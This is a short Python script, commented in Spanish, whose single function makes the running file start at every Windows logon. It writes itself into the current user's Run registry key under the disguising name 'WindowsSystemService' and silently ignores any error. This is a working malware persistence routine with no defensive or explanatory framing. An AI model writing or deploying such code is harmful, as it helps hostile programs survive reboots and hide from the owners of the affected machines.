#!/usr/bin/env python3
import os
import sys
import winreg


def establish_persistence():
    """Establecer persistencia en registro Windows"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsSystemService", 0, winreg.REG_SZ, current_file)
        return True
    except Exception as e:
        return False